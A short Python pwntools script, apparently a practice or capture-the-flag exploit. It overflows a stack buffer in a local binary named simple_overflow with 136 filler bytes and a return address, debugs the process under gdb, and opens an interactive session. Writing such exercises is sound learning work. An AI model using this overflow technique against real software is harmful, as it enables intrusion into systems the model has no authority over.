from pwn import *

def debug(argv):
    p = process(argv=argv)

    gdb.attach(p, gdbscript='''
        b *0x000000000040131b
        c
    ''')

    payload = b'A' * 128 + b'B' * 8 + p64(0x00000000004011c6)

    with open('payload.txt', 'wb') as f:
        f.write(payload)

    p.sendlineafter(b'input:', payload)

    p.interactive()

def main(argv):

    p = process(argv=argv)

    p.interactive()


if __name__ == "__main__":
    context.arch = "amd64"
    context.terminal = ['tmux', 'splitw', '-h']
    context.log_level='debug'

    argv = ['./simple_overflow']

    # main(argv)
    debug(argv)